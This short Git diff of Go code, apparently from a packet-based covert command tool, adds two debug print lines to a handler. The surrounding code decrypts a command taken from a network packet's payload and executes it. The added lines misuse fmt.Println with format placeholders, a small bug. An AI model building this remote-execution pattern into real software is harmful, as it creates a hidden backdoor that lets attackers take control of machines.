@@ -520,6 +520,8 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		tmp := payload[4]
 		cmd := decryptCommand(tmp)
 		execCommand(cmd)
+		if debugCheck != "" { fmt.Println("lastPingRan: %s\n",lastPingRan) }
+		if debugCheck != "" { fmt.Println("cmd: %s\n",cmd) }
 		if lastPingRan != cmd {
 			//get ping command
 			if len(payload) > 5 {
